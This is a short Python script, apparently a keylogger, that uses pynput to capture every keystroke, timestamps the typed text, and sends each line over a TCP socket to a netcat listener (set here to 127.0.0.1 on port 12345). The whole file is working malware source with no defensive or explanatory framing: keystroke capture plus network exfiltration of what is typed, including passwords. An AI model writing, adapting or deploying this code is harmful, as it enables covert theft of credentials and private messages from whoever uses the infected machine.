import ctypes
from pynput.keyboard import Key, Listener
import socket
from datetime import datetime

# configure the connection to the nc listener
nc_host = '127.0.0.1'
nc_port = 12345

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((nc_host, nc_port))

current_line = f"{datetime.now()} - "

def on_press(key):
    global current_line
    # if space is pressed, send the current line to the nc listener
    if key == Key.space or key == Key.enter:
        sock.sendall((current_line + "\n").encode('utf-8'))
        current_line = f"{datetime.now()} - "
    else:
        try:
            current_line += key.char  # add the character to the current line
        except AttributeError:
            current_line += f" [{key}] "  # if the key is not a character, write it in brackets

def on_release(key):
    if key == Key.esc:
        sock.close()
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()